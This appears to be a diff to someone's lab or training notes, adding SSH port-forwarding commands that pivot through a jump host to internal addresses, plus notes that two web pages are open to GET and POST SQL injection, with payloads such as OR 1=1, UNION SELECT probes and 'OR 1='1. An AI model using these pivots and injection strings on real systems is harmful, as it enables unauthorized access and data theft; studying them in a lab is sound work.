@@ -181,5 +181,15 @@ ssh -S /tmp/web bill -O forward -D 9050
 #Create port forward to T2 web server 
 ssh -S /tmp/web T2  -O foward -L 5152:10.100.28.55:80
 -------------------------------------------------------------DAY 2-------------------------------------------------
+#Create ssh port forward to .48 
+ssh -S /tmp/jump jump -O forward -L 7012:10.100.28.48:80 -L 7013:10.100.28.48:4444
+#Categories page is vulnerable to GET SQL injection
+#In URL 
+OR 1=1
+UNION SELECT 1,2,3 
+UNION SELECT GOLDEN SEARCH
+UNION SELECT ...,...,...(@@version used for SQL ver) from sqlinjection.share4/members/payments 
+#SearchProducts is vulnerable to POST SQL injection 
+'OR 1='1
 
 
